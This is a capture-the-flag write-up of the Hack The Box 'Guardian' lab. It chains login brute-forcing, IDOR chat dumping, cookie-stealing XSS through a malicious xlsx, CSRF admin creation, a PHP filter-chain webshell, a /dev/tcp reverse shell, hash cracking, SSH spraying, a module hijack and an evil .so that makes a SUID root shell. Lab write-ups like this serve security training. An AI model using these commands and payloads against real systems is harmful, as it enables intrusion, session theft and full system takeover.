---
icon: person-military-pointing
cover: ../../../../.gitbook/assets/Screenshot 2026-03-01 213455.png
coverY: -15.102868119118801
---

# HTB-GUARDIAN

### Reconnaissance

#### Port Scan

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ rustscan -a 10.10.11.84 blah blah
```

```
Open 10.10.11.84:22
Open 10.10.11.84:80

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://guardian.htb/
```

Port 80 immediately redirects to `guardian.htb` — virtual host routing confirmed. OpenSSH 8.9p1 with Ubuntu package `3ubuntu0.13` maps to Ubuntu 22.04 Jammy. Both ports show TTL 63, which is Linux one hop away, consistent.

Add to `/etc/hosts`:

```
10.10.11.84 guardian.htb portal.guardian.htb
```

#### Subdomain Discovery

The main domain is using hostname-based routing so there are almost certainly more vhosts. Starting with a standard subdomain fuzz:

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ ffuf -u http://10.10.11.84 -H "Host: FUZZ.guardian.htb" \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

portal    [Status: 302, Size: 0, Duration: 41ms]
```

`portal.guardian.htb` found. Update `/etc/hosts` and move on.

***

### guardian.htb — Reconnaissance

The main site is a static university homepage running on Apache. No interesting directories on feroxbuster — it's essentially a brochure site. But it gives us three important things before we even touch the portal:

<figure><img src="../../../../.gitbook/assets/image (585).png" alt=""><figcaption></figcaption></figure>

**Student ID format** — three testimonials on the homepage have visible student IDs. Looking at them: `GU0142023`, `GU6262023`, `GU0702025`. The pattern is `GU` + three-digit zero-padded number + four-digit year. That's roughly 1000 × 7 years = 7000 possible IDs — totally brute-forceable.

<figure><img src="../../../../.gitbook/assets/image (586).png" alt=""><figcaption></figcaption></figure>

**Email addresses** — `admissions@guardian.htb` at the bottom, and later `support@guardian.htb` in the portal guide. Useful for understanding who runs what.

**A link to the portal** — pointing at `portal.guardian.htb`

<figure><img src="../../../../.gitbook/assets/image (587).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (588).png" alt=""><figcaption></figcaption></figure>

***

### portal.guardian.htb — Initial Enumeration

#### Directory Brute Force

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ feroxbuster -u http://portal.guardian.htb -x php
```

```
302  /               → /login.php
200  /login.php
200  /forgot.php
200  /static/downloads/Guardian_University_Student_Portal_Guide.pdf
302  /admin/createuser.php    → /login.php
302  /admin/users.php         → /login.php
200  /admin/reports/system.php        [no auth required]
200  /admin/reports/financial.php     [no auth required]
200  /admin/reports/enrollment.php    [no auth required]
200  /vendor/composer/installed.php
```

A few things worth noting here. The `/admin/*` pages mostly redirect to login — except the four report pages which return 200 directly. On a real engagement that's an information disclosure finding. In CTF context it's probably just auth being forgotten during development.

More interestingly: there's a PDF at `/static/downloads/`. That's publicly accessible without authentication.

#### Default Credentials from the PDF

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ curl -O http://portal.guardian.htb/static/downloads/Guardian_University_Student_Portal_Guide.pdf
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ exiftool Guardian_University_Student_Portal_Guide.pdf

Producer   : Microsoft® Word 2016
Creator    : python-docx
Create Date: 2025:01:05 10:18:32
```

The PDF is a student onboarding guide. It mentions that new students receive a **default password of `GU1234`** on account creation.

This is a university giving out a publicly accessible document telling you exactly what the default password is. Combined with the predictable ID format from the homepage — we have everything we need to brute force login.

#### Brute Forcing the Login

Rather than generating a wordlist file and passing it to hydra, I'll use ffuf with bash process substitution to generate both number ranges inline. This way I don't need to create any files and ffuf tests all COUNT × YEAR combinations:

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ ffuf -u 'http://portal.guardian.htb/login.php' \
  -d 'username=GUCOUNTYEAR&password=GU1234' \
  -w <(seq -w 000 999):COUNT \
  -w <(seq 2020 2026):YEAR \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -ac

[Status: 302, Size: 0]
    * COUNT: 014
    * YEAR: 2023
```

One hit — `GU0142023:GU1234`. This student never changed their default password.

***

### Authenticated Enumeration as Student

#### Dashboard Overview

<figure><img src="../../../../.gitbook/assets/image (589).png" alt=""><figcaption></figcaption></figure>

After logging in, there's a standard student portal — Courses, Assignments, Grades, Chats, Notices. Nothing immediately explosive, but there's a lot of surface area to poke at.

The assignment submission form accepts `.docx` and `.xlsx` — file uploads are always worth noting, especially when there's a reviewer (lecturer) on the other end.

#### IDOR in the Chat Feature

<figure><img src="../../../../.gitbook/assets/image (590).png" alt=""><figcaption></figcaption></figure>

The chat URL structure catches my eye immediately:

```
/student/chat.php?chat_users[0]=13&chat_users[1]=11
```

Two integer IDs. I check whether the server validates that the current user is one of those two people — and it doesn't. I can pass any two IDs and read their conversation. This is a classic IDOR.

To enumerate all non-empty chats efficiently, I'll fuzz both parameters at once and save to JSON for processing:

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ ffuf -u 'http://portal.guardian.htb/student/chat.php?chat_users[0]=NUM1&chat_users[1]=NUM2' \
  -w <(seq 1 62):NUM1 \
  -w <(seq 1 62):NUM2 \
  -H 'Cookie: PHPSESSID=YOURSESSID' \
  -ac -o chats.json -of json
```

This produces 64 results but half are mirrors (`1↔2` and `2↔1` are the same conversation). Filter to unique pairs using jq:

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ cat chats.json | jq '.results[] | select((.input.NUM1|tonumber) < (.input.NUM2|tonumber)) | .url' -r
```

32 unique conversations. Rather than clicking through each one, I write a quick bash script to dump all content:

```bash
#!/bin/bash
COOKIE="PHPSESSID=YOURSESSID"

cat chats.json | jq -r '.results[] | select((.input.NUM1|tonumber) < (.input.NUM2|tonumber)) | "\(.input.NUM1) \(.input.NUM2) \(.url)"' | \
while read -r n1 n2 url; do
  echo "=== Chat: User $n1  User $n2 ==="
  curl -gs "$url" -b "$COOKIE" | awk '
    /text-sm text-gray-500 mb-1/ {
      getline; gsub(/<span.*/, ""); gsub(/^[[:space:]]+|[[:space:]]+$/, ""); sender=$0; next
    }
    /class="text-gray-800"/ {
      getline; gsub(/<\/div>.*/, ""); gsub(/^[[:space:]]+|[[:space:]]+$/, "")
      if (sender != "") print sender ": " $0
    }
  '
  echo
done
```

Running it:

```
=== Chat: User 1 <-> User 2 ===
admin: Hello! How are you doing today?
admin: Here is your password for gitea: DHsNnk3V503
jamil.enockson: I am doing great, thanks.

=== Chat: User 1 <-> User 3 ===
admin: Hey, I have a quick question regarding the assignment submission.
mark.pargetter: Sure, feel free to ask!
...
```

Jackpot on the first one. The admin sent `jamil.enockson` a Gitea password in plain text over an internal chat — which any authenticated student can read because there's no authorization check.

***

### Gitea — Source Code Access

<figure><img src="../../../../.gitbook/assets/image (591).png" alt=""><figcaption></figcaption></figure>

#### Finding the Gitea Subdomain

I didn't find it in the initial subdomain fuzz because `gitea` wasn't in the top 20k list as a standalone result. Re-running with a filtered list pulls it immediately:

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ ffuf -u http://10.10.11.84 -H "Host: FUZZ.guardian.htb" \
  -w <(cat /opt/SecLists/Discovery/DNS/* | grep git | sort -u) -ac

gitea    [Status: 200]
```

Add `gitea.guardian.htb` to `/etc/hosts`. Login with `jamil.enockson@guardian.htb:DHsNnk3V503` works.

#### Cloning the Repository

<figure><img src="../../../../.gitbook/assets/image (592).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (593).png" alt=""><figcaption></figcaption></figure>

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ git clone http://jamil.enockson%40guardian.htb:DHsNnk3V503@gitea.guardian.htb/Guardian/portal.guardian.htb.git
```

#### What the Source Tells Us

`config/config.php` has the database credentials and a global salt:

```php
return [
    'db' => [
        'dsn'      => 'mysql:host=localhost;dbname=guardiandb',
        'username' => 'root',
        'password' => 'Gu4rd14n_un1_1s_th3_b3st',
    ],
    'salt' => '8Sb)tM1vs1SS'
];
```

`composer.json` shows the PHP dependencies:

```json
{
    "require": {
        "phpoffice/phpspreadsheet": "3.7.0",
        "phpoffice/phpword": "^1.3"
    }
}
```

phpspreadsheet `3.7.0` — I immediately search for CVEs. CVE-2025-22131 is a stored XSS triggered when parsing an xlsx file with a malicious sheet name. The vulnerable sink in `lecturer/view-submission.php` is identical to the PoC:

```php
$spreadsheet = IOFactory::load('../attachment_uploads/' . $submission['attachment_name']);
$writer = new Html($spreadsheet);
$writer->writeAllSheets();
echo $writer->generateHTMLAll();
```

And `config/csrf-tokens.php` shows a broken CSRF implementation — tokens are added to a global pool but **never removed or expired**:

```php
function add_token_to_pool($token) {
    $tokens = get_token_pool();
    $tokens[] = $token;
    file_put_contents($global_tokens_file, json_encode($tokens));
}

function is_valid_token($token) {
    $tokens = get_token_pool();
    return in_array($token, $tokens);   // tokens live forever
}
```

Any token ever generated is permanently valid. Since `lecturer/notices/create.php` generates a token on page load and I can access that page as a student, I can grab a token that works against any admin action — including `admin/createuser.php`.

The attack path is becoming clear: XSS the lecturer to steal their session, then use the broken CSRF to create an admin account.

***

### XSS via CVE-2025-22131 — Session Hijacking

#### Why This Works

phpspreadsheet renders sheet names as HTML when generating the HTML view. If a sheet name contains JavaScript, it executes in the browser of whoever views the spreadsheet — in this case, the lecturer reviewing the submission.

The session cookie is **not** `httpOnly`, so JavaScript can read `document.cookie` and exfiltrate it.

#### Crafting the Malicious XLSX

I create a blank two-sheet workbook in LibreOffice Calc and save it as `cookie.xlsx`. LibreOffice won't let me put HTML in a sheet name through the GUI, so I edit the underlying XML directly. The XLSX format is just a zip archive:

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ unzip cookie.xlsx -d xssbook/
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ vim xss.xlsx
```

Vim can edit files inside a zip archive in place without changing metadata. Navigate to `xl/workbook.xml`, find the sheet name attribute, and replace it with the XSS payload — HTML-encoding the angle brackets so the XML stays valid:

Save and exit. File is still valid Excel:

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ file xss.xlsx
xss.xlsx: Microsoft Excel 2007+
```

#### Delivery and Capture

Start a listener:

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ python3 -m http.server 80
```

Log in as the student (`GU0142023`), navigate to the upcoming assignment, and upload `xss.xlsx`. About a minute later, the lecturer reviews it:

```
10.10.11.84 - - "GET /x?c=PHPSESSID=0a9pcffih704fkjksd8e197enm HTTP/1.1" 404 -
```

Set the stolen `PHPSESSID` in browser dev tools (Application → Cookies) and refresh. We're now logged in as `sammy.treat`, a lecturer.

***

### CSRF → Admin Account Creation

#### Getting a Permanent CSRF Token

As lecturer, load the notice creation page at `/lecturer/notices/create.php`. The page source contains a CSRF token that was just added to the global pool. Since the pool is never cleared, this token is valid forever:

<pre><code><strong>csrf_token=aa760196c89548022e12266fc3cc7f04
</strong></code></pre>

#### The Target — createuser.php

Looking at `admin/createuser.php` from the cloned source, it creates a new user from POST parameters after a CSRF check. The CSRF check just calls `is_valid_token()` — which, as we've seen, accepts any token that was ever generated, by anyone.

#### Crafting the Payload

Create `csrf_createuser.html`:

<pre class="language-html"><code class="lang-html"><strong>document.getElementById('csrf').submit();
</strong></code></pre>

When the admin loads this page, the script auto-submits the form — creating our admin user in their session context.

Host the file and send a notice with our URL as the reference link:

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ python3 -m http.server 80
```

A minute or so after submitting the notice:

<pre><code><strong>10.10.11.84 - - "GET /csrf_createuser.html HTTP/1.1" 200 -
</strong></code></pre>

Log in as `sn0x:sn0xR00t!` — full admin dashboard.

***

### LFI → RCE via PHP Filter Chains

#### The Vulnerability

The admin reports panel includes a file based on `?report=`:

```php
$report = $_GET['report'] ?? 'reports/academic.php';

if (strpos($report, '..') !== false) {
    die("Malicious request blocked");
}

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("Access denied. Invalid file");
}

include($report);
```

Two filters: no `..`, and the path must end with one of four `.php` filenames. Neither filter touches the `php://` wrapper. So `php://filter/.../resource=reports/enrollment.php` passes both checks — no `..` anywhere, and it ends with `enrollment.php`.

PHP filter chains can encode arbitrary PHP code into a chain of `iconv` conversions that PHP decodes back to source before executing. This turns a read-only LFI into full RCE.

#### Generating the Webshell Chain

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ uv run php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'

php://filter/convert.iconv.UTF8.CSISO2022KR|...[long chain]...|convert.base64-decode/resource=php://temp
```

Replace the `php://temp` at the end with `reports/enrollment.php`, and test:

```
http://portal.guardian.htb/admin/reports.php?cmd=id&report=php://filter/...[chain].../resource=reports/enrollment.php
```

Response contains:

<pre><code><strong>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</strong></code></pre>

RCE confirmed. Get a reverse shell:

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ nc -lnvp 443
```

URL-encode a bash reverse shell in the `cmd` parameter:

```
cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.32/443+0>%261'
```

```
Connection received on 10.10.11.84 46204
www-data@guardian:~/portal.guardian.htb/admin$
```

Shell upgrade:

```
www-data@guardian:~$ script /dev/null -c bash
^Z
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ stty raw -echo; fg
reset
Terminal type? screen
www-data@guardian:~$
```

***

### Shell as jamil — Database Extraction and Hash Cracking

#### MySQL Access

The DB credentials from the source code work:

```
www-data@guardian:~$ mysql -u root -p'Gu4rd14n_un1_1s_th3_b3st' guardiandb

mysql> select username, password_hash from users;
```

63 users, all with salted SHA256 hashes. The hashing scheme from `createuser.php`:

```php
$password = hash('sha256', $password . $salt);
```

That's `sha256($pass.$salt)` — hashcat mode **1410**.

#### Preparing the Hash File

Format is `hash:salt`. The salt is `8Sb)tM1vs1SS` for all users. Build the file:

```
694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS
c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS
8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e:8Sb)tM1vs1SS
[... all 63 hashes ...]
```

#### Cracking

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ hashcat -m 1410 hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt

c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS:copperhouse56
694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS:fakebake000
```

Two cracks in \~11 seconds through rockyou.

#### SSH Access

Cross-reference the hashes against the `username` column — `c1d8df...` belongs to `jamil.enockson`. Rather than doing that manually, just spray both passwords against all known shell users:

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ netexec ssh guardian.htb -u users.txt -p passwords.txt --continue-on-success

[+] guardian.htb  jamil:copperhouse56  Linux - Shell access!
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ ssh jamil@guardian.htb
Password: copperhouse56

jamil@guardian:~$ cat user.txt
f83eb0b6************************
```

***

### Shell as mark — Python Module Hijacking

#### Sudo Check

```
jamil@guardian:~$ sudo -l

User jamil may run the following commands on guardian:
    (mark) NOPASSWD: /opt/scripts/utilities/utilities.py
```

Jamil can run a specific Python script as mark without a password. Let's see what's in the script tree:

```
jamil@guardian:~$ find /opt/scripts -type f -ls

-rwxrwx---  1 mark  admins   253  /opt/scripts/utilities/utils/status.py
-rw-r-----  1 root  admins   287  /opt/scripts/utilities/utils/attachments.py
-rw-r-----  1 root  admins   246  /opt/scripts/utilities/utils/db.py
-rw-r-----  1 root  admins   226  /opt/scripts/utilities/utils/logs.py
-rwxr-x---  1 root  admins  1136  /opt/scripts/utilities/utilities.py
```

Most files are root:admins, read-only for admins. But `status.py` is owned by **mark** with permissions `rwxrwx---` — meaning the `admins` group can write to it.

```
jamil@guardian:~$ id
uid=1000(jamil) gid=1000(jamil) groups=1000(jamil),1002(admins)
```

Jamil is in the `admins` group. So jamil can overwrite `status.py`.

The main script calls `status.system_status()` when the `system-status` action is passed. We control what that function does. Classic Python module hijack.

#### Exploit

Replace `status.py` with a version that also writes our SSH key into mark's home directory:

```python
import platform
import psutil
import os

def system_status():
    print("System:", platform.system(), platform.release())
    print("CPU usage:", psutil.cpu_percent(), "%")
    print("Memory usage:", psutil.virtual_memory().percent, "%")
    os.makedirs('/home/mark/.ssh', mode=0o700, exist_ok=True)
    with open('/home/mark/.ssh/authorized_keys', 'a') as f:
        f.write('\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...your_pubkey_here... sn0x\n')
    print('Key written.')
```

Run it as mark:

```
jamil@guardian:/opt/scripts/utilities/utils$ sudo -u mark /opt/scripts/utilities/utilities.py system-status

System: Linux 5.15.0-152-generic
CPU usage: 50.0 %
Memory usage: 32.2 %
Key written.
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ ssh -i ~/.ssh/id_ed25519 mark@guardian.htb

mark@guardian:~$
```

***

### Shell as root — safeapache2ctl

#### Sudo Check

```
mark@guardian:~$ sudo -l

User mark may run the following commands on guardian:
    (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```

Any user, no password. That's a strong hint this is the root path.

#### What is safeapache2ctl?

It's a custom ELF binary — not the standard `apache2ctl` wrapper. Running it shows the usage:

```
mark@guardian:~$ sudo safeapache2ctl
Usage: safeapache2ctl -f /home/mark/confs/file.conf
```

If I try to pass a file outside that directory:

```
mark@guardian:~$ sudo safeapache2ctl -f /etc/passwd
Access denied: config must be inside /home/mark/confs/
```

So it restricts config files to `/home/mark/confs/`. But it then passes the config to the real `apache2ctl -f` which validates and potentially starts Apache. The intent is "give mark a restricted way to manage Apache configs". Let's see how restricted it actually is.

#### Reversing the Binary

```
┌──(sn0x㉿sn0x)-[~/HTB/Guardian]
└─$ scp -i ~/.ssh/id_ed25519 mark@guardian.htb:/usr/local/bin/safeapache2ctl .
```

Opening in Ghidra. The `main()` function:

```c
res = realpath((char *)argv[2], resolved_path);       // resolve the config path
result = starts_with(resolved_path, "/home/mark/confs/");  // must be inside confs
if (result == 0) {
    fprintf(stderr, "Access denied...");
}
// read config line by line through is_unsafe_line()
// if all lines pass → execl("/usr/sbin/apache2ctl", "-f", resolved_path)
```

The `is_unsafe_line()` function:

```c
sscanf(line, "%31s %1023s", directive, directive_arg);

result = strcmp(directive, "Include");
if (result == 0) {
    // check directive_arg starts with /home/mark/confs/
}
result = strcmp(directive, "IncludeOptional");
// same check
result = strcmp(directive, "LoadModule");
// same check — BUT reads directive_arg which is the MODULE NAME, not the path
```

Two major design flaws spotted immediately while reading this.

#### Bypass 1 — Case Sensitivity

Apache directives are **case-insensitive**. The binary checks with `strcmp()` which is **case-sensitive**. So `Include` is blocked but `InClUde` is not:

```
mark@guardian:~/confs$ cat read.conf
LoadModule mpm_worker_module /usr/lib/apache2/modules/mod_mpm_worker.so
InClUde /root/root.txt

mark@guardian:~/confs$ sudo safeapache2ctl -f ./read.conf
AH00526: Syntax error on line 1 of /root/root.txt:
Invalid command 'e***********************', perhaps misspelled...
```

That's the first line of root.txt leaking through an Apache syntax error. Any file on the system is readable this way.

#### Bypass 2 — Directory Traversal

Even with the correctly-cased `Include`, the path check uses `starts_with("/home/mark/confs/")` but doesn't call `realpath()` on the directive argument — only on the config file itself. So `..` traversal bypasses the check:

```
Include /home/mark/confs/../../../root/root.txt
```

Same file read result.

#### Bypass 3 — Symlinks

Since the directive arg path is never resolved, a symlink inside `/home/mark/confs/` pointing anywhere is also valid:

```
mark@guardian:~/confs$ ln -s /root/root.txt root.txt
mark@guardian:~/confs$ cat read.conf
LoadModule mpm_worker_module /usr/lib/apache2/modules/mod_mpm_worker.so
Include /home/mark/confs/root.txt
```

Same result — arbitrary file read.

#### Bypass 4 — LoadModule Checks the Wrong Argument

This is the one that actually gets us a shell. The `LoadModule` syntax in Apache is:

```
LoadModule <module_name> <path_to_so>
```

The `sscanf` in `is_unsafe_line()` reads `directive_arg` as the **second** whitespace-delimited token. For `LoadModule`, that's the **module name**, not the path. The path is the **third** token — and the binary never checks it at all.

This is why loading the MPM module from `/usr/lib/apache2/modules/` worked from the start without any errors. The check on `directive_arg` only sees `mpm_worker_module`, not the actual file path.

Meaning we can point `LoadModule` at any `.so` file on the system — including one we create in `/home/mark/confs/`.

#### Building the Evil Module

When Apache loads a shared object, it calls any function marked with `__attribute__((constructor))` before anything else — even before it checks whether the module has the correct Apache API structure. We use this to run our payload:

```c
// evil.c
#include 

__attribute__((constructor))
void pwn(void) {
    system("cp /bin/bash /tmp/sn0x && chmod +s /tmp/sn0x");
}
```

Compile as a shared library:

```
mark@guardian:~/confs$ gcc -shared -fPIC -o evil.so evil.c
```

Config file:

```
mark@guardian:~/confs$ cat evil.conf
LoadModule mpm_worker_module /usr/lib/apache2/modules/mod_mpm_worker.so
LoadModule pwn_module /home/mark/confs/evil.so
```

Run it:

```
mark@guardian:~/confs$ sudo safeapache2ctl -f ./evil.conf
apache2: Syntax error on line 3 of /home/mark/confs/evil.conf:
Can't locate API module structure `pwn_module' in file /home/mark/confs/evil.so: ...undefined symbol: pwn_module
Action '-f /home/mark/confs/evil.conf' failed.
```

Apache errors out because our `.so` doesn't export the right module structure — but the constructor already ran before that check:

```
mark@guardian:~/confs$ ls -l /tmp/sn0x
-rwsr-sr-x 1 root root 1396520 /tmp/sn0x
```

SUID bash is sitting there. Use `-p` to prevent bash from dropping the elevated UID:

```
mark@guardian:~/confs$ /tmp/sn0x -p
sn0x-5.1# id
uid=1001(mark) gid=1003(mark) euid=0(root) egid=0(root)

sn0x-5.1# cat /root/root.txt
```

#### Bonus — Apache Web Server as File Read

There's another angle worth noting. When `apache2ctl -f` runs a config, it briefly starts a web server to validate that the config works. We can exploit this window to serve files from `/root` over a custom port:

```
mark@guardian:~/confs$ cat webserver.conf
LoadModule mpm_worker_module /usr/lib/apache2/modules/mod_mpm_worker.so
LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so
ServerName Test
DocumentRoot /root
Listen 9000
ErrorLog /tmp/apache_error.log

mark@guardian:~/confs$ sudo safeapache2ctl -f ./webserver.conf &
mark@guardian:~/confs$ curl localhost:9000/root.txt
```

The web server is only alive for a few seconds — but that's enough. This gives you file read as root without needing to write any C code.

***

### Attack Flow

```
guardian.htb (static site)
  → Student IDs visible in testimonials (GU<3 digits><year> format)
  → PDF guide linked publicly → default password GU1234

portal.guardian.htb
  → ffuf dual-wordlist (seq process substitution) → GU0142023:GU1234
  → IDOR in /student/chat.php (no auth check on chat_users[])
    → ffuf enumerate all 62×62 user pairs → 32 unique chats
    → Chat 1↔2: admin sent jamil.enockson Gitea creds (DHsNnk3V503) in plaintext

gitea.guardian.htb
  → Targeted ffuf with git-specific wordlist → gitea.guardian.htb
  → Clone portal source as jamil.enockson
    → config/config.php: DB root creds + salt (8Sb)tM1vs1SS)
    → composer.json: phpspreadsheet 3.7.0 → CVE-2025-22131 (XSS via sheet name)
    → csrf-tokens.php: tokens never invalidated → permanent CSRF

XSS Chain
  → Edit xl/workbook.xml inside xlsx zip (vim in-place) → inject onerror payload
  → Upload to assignment submission → lecturer views → cookie stolen (not httpOnly)
  → Session hijack → sammy.treat (lecturer)
  → Extract permanent CSRF token from notice creation page
  → CSRF payload → admin clicks notice link → sn0x:sn0xR00t! admin account created

LFI → RCE
  → /admin/reports.php?report= — blocks '..' and requires *.php suffix
  → php://filter chain bypasses both checks → resource=reports/enrollment.php
  → php_filter_chain_generator → webshell → reverse shell as www-data

Privesc Chain
  → MySQL (root:Gu4rd14n_un1_1s_th3_b3st) → 63 salted SHA256 hashes
  → hashcat -m 1410 → copperhouse56 (jamil.enockson)
  → netexec SSH spray → SSH as jamil → user.txt

  → sudo (mark) utilities.py → status.py writable by admins group
  → jamil in admins → overwrite status.py → SSH key for mark injected
  → SSH as mark

  → sudo (ALL) safeapache2ctl → Ghidra analysis
    → Bypass 1: case-sensitive strcmp on case-insensitive Apache directives
    → Bypass 2: starts_with() check without realpath() → directory traversal
    → Bypass 3: symlinks not resolved on directive args
    → Bypass 4: LoadModule arg check hits module NAME not path → any .so loadable
  → evil.so constructor → SUID bash → root → root.txt
  → Bonus: DocumentRoot /root + Listen → curl localhost:9000/root.txt
```

***

### Techniques

| Technique                                          | Where Used                                               |
| -------------------------------------------------- | -------------------------------------------------------- |
| ffuf dual-wordlist with process substitution       | Enumerate student ID + year combinations                 |
| IDOR (missing authorization on chat endpoint)      | Read all user chats without owning those accounts        |
| Targeted subdomain fuzzing (git-specific wordlist) | Find gitea.guardian.htb                                  |
| Source code clone from Gitea                       | Discover DB creds, salt, CSRF flaw, vulnerable library   |
| xlsx sheet name XSS (CVE-2025-22131)               | Steal lecturer session cookie via vim in-place zip edit  |
| Broken CSRF token pool (never invalidated)         | Reuse lecturer token for admin POST actions              |
| CSRF → admin account creation                      | Exploit admin notice click-through as delivery mechanism |
| PHP filter chain generator (LFI → RCE)             | Bypass `..` block and regex extension check              |
| hashcat mode 1410 `sha256($pass.$salt)`            | Crack salted hashes extracted from MySQL                 |
| netexec SSH spray                                  | Validate cracked credentials across all system users     |
| Python module hijacking (writable admins group)    | Escalate from jamil to mark via `sudo -u mark`           |
| Ghidra binary reversing                            | Identify all bypasses in safeapache2ctl                  |
| Evil shared object `.so` constructor               | LoadModule arg check targets wrong token → SUID bash     |
| Apache DocumentRoot file read                      | Alternative: point web server at /root, curl root.txt    |

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
